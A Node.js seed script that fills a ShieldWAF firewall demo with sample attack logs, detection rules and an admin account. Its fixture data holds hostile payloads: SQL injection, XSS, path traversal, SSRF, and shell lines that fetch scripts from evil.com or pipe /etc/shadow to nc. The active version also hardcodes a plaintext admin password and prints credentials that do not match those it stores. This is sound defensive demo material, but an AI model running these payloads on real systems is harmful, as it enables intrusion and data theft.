// /**
//  * seed.js — Populate MongoDB with realistic ShieldWAF demo data
//  * Run: node src/utils/seed.js
//  */

// require('dotenv').config({ path: require('path').join(__dirname, '../../.env') });
// const mongoose = require('mongoose');

// // ── Models ────────────────────────────────────────────────────────────────────
// const Log = require('../models/Log');
// const BlockIP = require('../models/BlockIP');
// const Rule = require('../models/Rule');
// const User = require('../models/User');

// // ── Helpers ───────────────────────────────────────────────────────────────────
// const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
// const pick = (arr) => arr[rand(0, arr.length - 1)];
// const randIp = () => `${rand(1, 254)}.${rand(1, 254)}.${rand(1, 254)}.${rand(1, 254)}`;
// const ago = (ms) => new Date(Date.now() - ms);

// // ── Attack datasets ───────────────────────────────────────────────────────────
// const ATTACK_TYPES = [
//     {
//         type: 'sqli', label: 'SQL Injection', severity: 'critical', action: 'blocked',
//         payloads: ["' OR '1'='1' --", "' UNION SELECT * FROM users --", "admin'--", "' OR 1=1 LIMIT 1--", "1; DROP TABLE users--"]
//     },
//     {
//         type: 'xss', label: 'XSS', severity: 'high', action: 'blocked',
//         payloads: ['<script>alert("xss")</script>', '<img onerror=alert(1) src=x>', 'javascript:alert(document.cookie)', '<svg onload=fetch("//evil.com")>']
//     },
//     {
//         type: 'path', label: 'Path Traversal', severity: 'critical', action: 'blocked',
//         payloads: ['../../../../etc/passwd', '../../../etc/shadow', '..%2F..%2F..%2Fetc%2Fpasswd', '/proc/self/environ']
//     },
//     {
//         type: 'cmd', label: 'Command Injection', severity: 'critical', action: 'blocked',
//         payloads: ['127.0.0.1; cat /etc/passwd', '| ls -la', '`whoami`', '$(id)', '127.0.0.1 && wget http://evil.com/shell.sh']
//     },
//     {
//         type: 'xxe', label: 'XXE Injection', severity: 'high', action: 'blocked',
//         payloads: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<!ENTITY ext SYSTEM "http://169.254.169.254/">']
//     },
//     {
//         type: 'csrf', label: 'CSRF Attack', severity: 'medium', action: 'blocked',
//         payloads: ['Missing CSRF token', 'Invalid CSRF token', 'CSRF token mismatch']
//     },
//     {
//         type: 'rce', label: 'Remote Code Execution', severity: 'critical', action: 'blocked',
//         payloads: ['require("child_process").exec("rm -rf /")', 'eval(base64_decode("..."))', 'system("curl evil.com|bash")']
//     },
//     {
//         type: 'ssrf', label: 'SSRF', severity: 'high', action: 'blocked',
//         payloads: ['http://169.254.169.254/latest/meta-data', 'http://localhost:8080/admin', 'http://10.0.0.1/internal']
//     },
//     {
//         type: 'none', label: '—', severity: 'low', action: 'allowed',
//         payloads: ['/api/search?q=hello', '/api/products?page=1', '/api/status', '/api/users?limit=10']
//     },
// ];

// const PATHS = [
//     '/api/login', '/api/search', '/api/products', '/api/config',
//     '/api/upload', '/api/users', '/api/admin/users', '/api/auth',
//     '/api/status', '/api/transfer', '/api/reset-password', '/api/orders',
//     '/api/payments', '/api/profile', '/api/settings',
// ];

// const METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];

// // Country → IP prefix mapping (realistic)
// const COUNTRY_IPS = {
//     'Russia': ['109.169', '91.108', '5.188', '185.220'],
//     'China': ['45.155', '103.76', '116.62', '47.90'],
//     'United States': ['104.21', '203.0', '198.51', '67.205'],
//     'Netherlands': ['77.83', '185.220', '185.130', '194.165'],
//     'India': ['172.16', '103.21', '49.36', '117.18'],
//     'Germany': ['91.108', '5.188', '89.234', '194.165'],
//     'France': ['89.234', '91.134', '212.129', '163.172'],
//     'Brazil': ['179.108', '189.112', '201.73', '45.225'],
//     'UK': ['198.51', '81.2', '185.198', '94.23'],
//     'Ukraine': ['91.196', '176.119', '185.242', '194.44'],
// };

// const countryList = Object.keys(COUNTRY_IPS);

// function countryIp(country) {
//     const prefixes = COUNTRY_IPS[country];
//     const pfx = pick(prefixes);
//     return `${pfx}.${rand(1, 254)}.${rand(1, 254)}`;
// }

// // ── Default WAF Rules ─────────────────────────────────────────────────────────
// const DEFAULT_RULES = [
//     { name: 'SQL Injection Detection', description: 'Detects UNION, DROP, SELECT patterns in user input fields', category: 'sqli', severity: 'critical', pattern: '(union|select|insert|drop|delete)', targets: ['body', 'query', 'url'], action: 'block', isActive: true, hitCount: 634 },
//     { name: 'XSS Script Tag Filter', description: 'Blocks <script>, onerror, javascript: injection patterns', category: 'xss', severity: 'high', pattern: '<script|onerror|javascript:', targets: ['body', 'query'], action: 'block', isActive: true, hitCount: 421 },
//     { name: 'Path Traversal Block', description: 'Blocks ../ sequences and /etc/passwd access attempts', category: 'path', severity: 'critical', pattern: '\\.\\./', targets: ['url', 'query'], action: 'block', isActive: true, hitCount: 298 },
//     { name: 'Rate Limit — Brute Force', description: 'Blocks IPs exceeding 100 req/min on /login endpoint', category: 'custom', severity: 'medium', pattern: 'rate_limit_login', targets: ['url'], action: 'flag', isActive: true, hitCount: 187 },
//     { name: 'XXE Entity Detection', description: 'Detects SYSTEM and PUBLIC XML entity declarations', category: 'xxe', severity: 'high', pattern: '<!ENTITY|SYSTEM\\s+["\']', targets: ['body'], action: 'block', isActive: true, hitCount: 121 },
//     { name: 'CSRF Token Validator', description: 'Validates CSRF tokens on state-changing HTTP requests', category: 'csrf', severity: 'medium', pattern: 'csrf_missing', targets: ['headers'], action: 'flag', isActive: false, hitCount: 0 },
//     { name: 'Command Injection Guard', description: 'Detects shell metacharacters and command separators', category: 'cmd', severity: 'critical', pattern: ';\\s*(cat|ls|wget|curl|bash|sh)', targets: ['body', 'query'], action: 'block', isActive: true, hitCount: 76 },
//     { name: 'Suspicious User-Agent', description: 'Flags and logs known scanner and bot user-agents', category: 'custom', severity: 'low', pattern: 'sqlmap|nikto|nmap|masscan|dirbuster', targets: ['headers'], action: 'log', isActive: true, hitCount: 1204 },
// ];

// // ── Seed function ─────────────────────────────────────────────────────────────
// async function seed() {
//     console.log('\n🌱 ShieldWAF Seed Script Starting...\n');

//     await mongoose.connect(process.env.MONGO_URI);
//     console.log('✅ MongoDB connected');

//     // Clear existing data
//     await Promise.all([
//         Log.deleteMany({}),
//         BlockIP.deleteMany({}),
//         Rule.deleteMany({}),
//         User.deleteMany({}),
//     ]);
//     console.log('🗑️  Cleared existing data');

//     // ── 1. Admin user ──────────────────────────────────────────────────────────
//     await User.create({
//         username: 'admin',
//         email: 'admin@shieldwaf.io',
//         password: 'Admin@123',
//         role: 'admin',
//         isActive: true,
//         lastLogin: new Date(),
//     });
//     console.log('👤 Admin user created  (email: admin@shieldwaf.io | password: Admin@123)');

//     // ── 2. WAF Rules ───────────────────────────────────────────────────────────
//     await Rule.insertMany(DEFAULT_RULES);
//     console.log(`📋 ${DEFAULT_RULES.length} WAF rules seeded`);

//     // ── 3. Blocked IPs ─────────────────────────────────────────────────────────
//     const blockedIps = [
//         { ip: '109.169.23.11', reason: 'SQL Injection — 47 attempts', attackType: 'sqli', attackCount: 47, blockType: 'permanent', blockedBy: 'system' },
//         { ip: '45.155.205.4', reason: 'Command Injection attempt', attackType: 'cmd', attackCount: 12, blockType: 'permanent', blockedBy: 'system' },
//         { ip: '91.108.4.120', reason: 'XXE payload detected', attackType: 'xxe', attackCount: 8, blockType: 'permanent', blockedBy: 'admin' },
//         { ip: '185.220.4.17', reason: 'XSS flood — 234 attempts', attackType: 'xss', attackCount: 234, blockType: 'permanent', blockedBy: 'system' },
//         { ip: '5.188.10.210', reason: 'Path traversal attempts', attackType: 'path', attackCount: 31, blockType: 'permanent', blockedBy: 'system' },
//         {
//             ip: '176.119.5.22', reason: 'Brute force login', attackType: 'none', attackCount: 189, blockType: 'temporary', blockedBy: 'system',
//             expiresAt: new Date(Date.now() + 2 * 60 * 60 * 1000)
//         },
//         { ip: '103.76.22.88', reason: 'SSRF attempt', attackType: 'ssrf', attackCount: 5, blockType: 'permanent', blockedBy: 'admin' },
//         { ip: '201.73.45.12', reason: 'RCE payload in upload', attackType: 'rce', attackCount: 3, blockType: 'permanent', blockedBy: 'system' },
//     ];
//     await BlockIP.insertMany(blockedIps);
//     console.log(`🚫 ${blockedIps.length} IPs blocked`);

//     // ── 4. Attack Logs (7 days of realistic traffic) ──────────────────────────
//     const logs = [];
//     const now = Date.now();
//     const DAYS = 7;

//     // Per-hour traffic pattern (0=midnight, 8=morning spike, 14=afternoon peak)
//     const hourWeights = [0.3, 0.2, 0.2, 0.2, 0.3, 0.4, 0.6, 0.9, 1.2, 1.4, 1.5, 1.6, 1.5, 1.4, 1.8, 1.9, 1.7, 1.5, 1.3, 1.2, 1.0, 0.8, 0.6, 0.4];

//     for (let day = 0; day < DAYS; day++) {
//         for (let hour = 0; hour < 24; hour++) {
//             const weight = hourWeights[hour];
//             const baseCount = Math.round(rand(120, 220) * weight);
//             const attackRate = 0.04 + Math.random() * 0.03; // 4–7% attack rate
//             const attackCount = Math.round(baseCount * attackRate);
//             const cleanCount = baseCount - attackCount;

//             // ── Attack requests ──
//             for (let i = 0; i < attackCount; i++) {
//                 const atk = pick(ATTACK_TYPES.filter(a => a.type !== 'none'));
//                 const country = pick(countryList);
//                 const ts = new Date(now - day * 86400000 - hour * 3600000 - rand(0, 3599) * 1000);

//                 logs.push({
//                     ip: countryIp(country),
//                     method: pick(['POST', 'GET', 'PUT', 'DELETE']),
//                     url: pick(PATHS),
//                     path: pick(PATHS),
//                     payload: pick(atk.payloads),
//                     userAgent: pick(['sqlmap/1.7', 'Mozilla/5.0 (Nikto)', 'python-requests/2.28', 'curl/7.81', 'nmap scanner']),
//                     action: 'blocked',
//                     blocked: true,
//                     attackType: atk.type,
//                     threats: [{ type: atk.type, label: atk.label, severity: atk.severity }],
//                     aiScore: rand(65, 98),
//                     aiConfidence: rand(78, 97),
//                     aiProvider: 'mock',
//                     severity: atk.severity,
//                     triggeredRule: pick(DEFAULT_RULES).name,
//                     responseTime: rand(1, 8),
//                     source: 'waf',
//                     createdAt: ts,
//                     updatedAt: ts,
//                 });
//             }

//             // ── Clean requests ──
//             for (let i = 0; i < cleanCount; i++) {
//                 const country = pick(countryList);
//                 const ts = new Date(now - day * 86400000 - hour * 3600000 - rand(0, 3599) * 1000);

//                 logs.push({
//                     ip: countryIp(country),
//                     method: pick(METHODS),
//                     url: pick(PATHS),
//                     path: pick(PATHS),
//                     payload: '',
//                     userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                     action: 'allowed',
//                     blocked: false,
//                     attackType: 'none',
//                     threats: [],
//                     aiScore: rand(0, 15),
//                     aiConfidence: rand(85, 98),
//                     aiProvider: 'mock',
//                     severity: 'none',
//                     triggeredRule: null,
//                     responseTime: rand(1, 12),
//                     source: 'waf',
//                     createdAt: ts,
//                     updatedAt: ts,
//                 });
//             }
//         }
//     }

//     // Shuffle and insert in bulk
//     logs.sort(() => Math.random() - 0.5);

//     const BATCH = 1000;
//     for (let i = 0; i < logs.length; i += BATCH) {
//         await Log.insertMany(logs.slice(i, i + BATCH), { ordered: false });
//         process.stdout.write(`\r📝 Logs inserted: ${Math.min(i + BATCH, logs.length)} / ${logs.length}`);
//     }
//     console.log(`\n✅ ${logs.length} log entries seeded`);

//     // ── Summary ───────────────────────────────────────────────────────────────
//     const totalLogs = await Log.countDocuments();
//     const totalBlocked = await Log.countDocuments({ action: 'blocked' });
//     const blockRate = ((totalBlocked / totalLogs) * 100).toFixed(1);

//     console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
//     console.log('  ✅ Seed complete!');
//     console.log(`  📊 Total logs   : ${totalLogs.toLocaleString()}`);
//     console.log(`  🚫 Blocked      : ${totalBlocked.toLocaleString()} (${blockRate}%)`);
//     console.log(`  👤 Users        : 1 (admin)`);
//     console.log(`  📋 Rules        : ${DEFAULT_RULES.length}`);
//     console.log(`  🛡️  Blocked IPs  : ${blockedIps.length}`);
//     console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

//     await mongoose.disconnect();
//     process.exit(0);
// }

// seed().catch((err) => {
//     console.error('\n❌ Seed failed:', err.message);
//     console.error(err.stack);
//     process.exit(1);
// });










// PATH: server/src/utils/seed.js
// Run with: node src/utils/seed.js
// Seeds: 1 admin user + 8 WAF rules + 50 realistic attack logs

require('dotenv').config({ path: require('path').join(__dirname, '../../.env') })
const mongoose = require('mongoose')
const bcrypt = require('bcryptjs')
const User = require('../models/User')
const Rule = require('../models/Rule')
const Log = require('../models/Log')
const { DEFAULT_RULES } = require('../config/rules')

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/shieldwaf'

// ── Seed data ─────────────────────────────────────────────────────────────────
const SAMPLE_IPS = [
    { ip: '185.220.101.4', country: 'Russia', flag: '🇷🇺', code: 'RU' },
    { ip: '103.21.244.0', country: 'China', flag: '🇨🇳', code: 'CN' },
    { ip: '91.108.4.116', country: 'USA', flag: '🇺🇸', code: 'US' },
    { ip: '178.62.55.19', country: 'Germany', flag: '🇩🇪', code: 'DE' },
    { ip: '104.21.19.81', country: 'Brazil', flag: '🇧🇷', code: 'BR' },
    { ip: '5.188.10.51', country: 'Netherlands', flag: '🇳🇱', code: 'NL' },
    { ip: '209.58.143.5', country: 'USA', flag: '🇺🇸', code: 'US' },
    { ip: '172.16.0.45', country: 'India', flag: '🇮🇳', code: 'IN' },
    { ip: '45.155.205.4', country: 'Russia', flag: '🇷🇺', code: 'RU' },
    { ip: '8.8.8.8', country: 'USA', flag: '🇺🇸', code: 'US' },
]

const ATTACK_SAMPLES = [
    { type: 'SQL Injection', sev: 'Critical', risk: 97, action: 'Blocked', payload: "'; DROP TABLE users;--", path: '/api/login', method: 'POST', rule: 'SQL Injection Blocker' },
    { type: 'XSS', sev: 'High', risk: 82, action: 'Blocked', payload: '<script>alert(document.cookie)</script>', path: '/api/search', method: 'GET', rule: 'XSS Filter' },
    { type: 'SQL Injection', sev: 'Low', risk: 12, action: 'Allowed', payload: '/api/users?id=1&role=admin', path: '/api/users', method: 'GET', rule: '' },
    { type: 'Path Traversal', sev: 'High', risk: 88, action: 'Blocked', payload: '../../../etc/passwd', path: '/api/files', method: 'POST', rule: 'Path Traversal Guard' },
    { type: 'Command Injection', sev: 'Critical', risk: 99, action: 'Blocked', payload: '; cat /etc/shadow | nc 10.0.0.1', path: '/api/exec', method: 'DELETE', rule: 'Command Injection Shield' },
    { type: 'SSRF', sev: 'Critical', risk: 95, action: 'Blocked', payload: 'http://169.254.169.254/latest/meta-data', path: '/api/fetch', method: 'POST', rule: 'SSRF Blocker' },
    { type: 'XSS', sev: 'High', risk: 78, action: 'Blocked', payload: '<img src=x onerror=alert(1)>', path: '/api/comments', method: 'GET', rule: 'XSS Filter' },
    { type: 'Brute Force', sev: 'Medium', risk: 55, action: 'Warning', payload: '/admin/login [800 attempts]', path: '/admin/login', method: 'GET', rule: 'Brute Force Rate Limiter' },
    { type: 'XXE', sev: 'Critical', risk: 93, action: 'Blocked', payload: '<!ENTITY xxe SYSTEM "file:///etc/passwd">', path: '/api/xml', method: 'PUT', rule: 'XXE Injection Prevention' },
    { type: 'SQL Injection', sev: 'Low', risk: 5, action: 'Allowed', payload: '/api/products?search=laptop', path: '/api/products', method: 'GET', rule: '' },
    { type: 'SQL Injection', sev: 'Critical', risk: 96, action: 'Blocked', payload: "1' OR '1'='1", path: '/api/auth', method: 'POST', rule: 'SQL Injection Blocker' },
    { type: 'Path Traversal', sev: 'High', risk: 84, action: 'Blocked', payload: '../../config/database.yml', path: '/api/config', method: 'GET', rule: 'Path Traversal Guard' },
    { type: 'XSS', sev: 'High', risk: 79, action: 'Blocked', payload: 'javascript:alert(document.domain)', path: '/api/redirect', method: 'GET', rule: 'XSS Filter' },
    { type: 'SSRF', sev: 'Critical', risk: 91, action: 'Blocked', payload: 'http://192.168.1.1/admin', path: '/api/webhook', method: 'POST', rule: 'SSRF Blocker' },
    { type: 'Command Injection', sev: 'Critical', risk: 98, action: 'Blocked', payload: '`id` && wget http://evil.com/shell.sh', path: '/api/ping', method: 'POST', rule: 'Command Injection Shield' },
]

function randomBetween(a, b) {
    return Math.floor(Math.random() * (b - a + 1)) + a
}

function randomDate(daysAgo) {
    const now = Date.now()
    const past = now - daysAgo * 24 * 60 * 60 * 1000
    return new Date(past + Math.random() * (now - past))
}

async function seed() {
    try {
        console.log('🔗 Connecting to MongoDB...')
        await mongoose.connect(MONGO_URI)
        console.log('✅ Connected\n')

        // ── Clear existing data ──────────────────────────────────────────────────
        console.log('🗑  Clearing existing data...')
        await Promise.all([
            User.deleteMany({}),
            Rule.deleteMany({}),
            Log.deleteMany({}),
        ])

        // ── Create admin user ────────────────────────────────────────────────────
        console.log('👤 Creating admin user...')
        const hashedPw = await bcrypt.hash('password', 12)
        await User.create({
            name: 'Admin User',
            email: 'rahull@gmail.com',
            password: 'rahull@06',
            role: 'admin',
            isActive: true,
        })
        console.log('   ✅ admin@shieldwaf.io / password')

        // ── Create WAF rules ─────────────────────────────────────────────────────
        console.log('⚙  Creating WAF rules...')
        await Rule.insertMany(DEFAULT_RULES)
        console.log(`   ✅ ${DEFAULT_RULES.length} rules created`)

        // ── Create attack logs ───────────────────────────────────────────────────
        console.log('📋 Generating attack logs...')
        const logs = []

        // Generate 80 logs spread over last 7 days
        for (let i = 0; i < 80; i++) {
            const sample = ATTACK_SAMPLES[i % ATTACK_SAMPLES.length]
            const ipData = SAMPLE_IPS[randomBetween(0, SAMPLE_IPS.length - 1)]

            logs.push({
                timestamp: randomDate(7),
                ip: ipData.ip,
                country: ipData.country,
                countryFlag: ipData.flag,
                countryCode: ipData.code,
                method: sample.method,
                path: sample.path,
                attackType: sample.type,
                payload: sample.payload,
                severity: sample.sev,
                riskScore: Math.min(100, sample.risk + randomBetween(-5, 5)),
                action: sample.action,
                ruleTriggered: sample.rule,
                userAgent: 'Mozilla/5.0 (compatible; AttackBot/1.0)',
            })
        }

        await Log.insertMany(logs)
        console.log(`   ✅ ${logs.length} attack logs created`)

        console.log('\n🎉 Seed complete!\n')
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        console.log('  Login:    abc123@gmail.com')
        console.log('  Password: password')
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')

        process.exit(0)
    } catch (err) {
        console.error('❌ Seed failed:', err)
        process.exit(1)
    }
}

seed()
